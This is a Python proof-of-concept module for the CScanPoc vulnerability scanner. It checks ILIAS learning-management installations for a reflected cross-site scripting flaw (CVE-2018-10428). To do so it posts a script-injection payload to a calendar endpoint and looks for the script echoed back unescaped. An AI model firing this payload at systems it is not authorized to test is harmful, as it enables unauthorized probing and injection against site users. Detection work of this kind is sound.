# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ILIAS_0003_L'  # 平台漏洞编号，留空
    name = 'ILIAS跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-05-24'  # 漏洞公布时间
    desc = '''
        ILIAS是ILIAS团队开发的一套基于Web的学习管理系统。该系统包含课程管理、文件共享、即时对话等模块。 

        ILIAS 5.1.26之前版本、5.2.15之前的5.2.x版本和5.3.4之前的5.3.x版本中存在跨站脚本漏洞。远程攻击者可通过诱使用户访问攻击者构造的网站利用该漏洞执行任意的JavaScript代码。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-10487'  # 漏洞来源
    cnvd_id = 'CNVD-2018-10487'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10428'  # cve编号
    product = 'ILIAS'  # 漏洞应用名称
    product_version = '''Ilias Ilias <5.1.26
                         Ilias Ilias 5.2.*，<5.2.15
                         Ilias Ilias 5.3.*，<5.3.4'''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ca93cd0f-6c76-456b-813c-9c09dea8c954'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/ilias.php?cmd=add&cmdClass=ilcalendarappointmentgui&cmdNode=zm:ao:b1&baseClass=ilPersonalDesktopGUI'
            headers = {
                'Cookie': 'PHPSESSID=[...]; ilClientId=test',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = 'seed="><script>alert(123)</script>'
            url = self.target + payload
            r = requests.post(url, headers=headers, data=data)

            if "<script>alert(123)</script>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
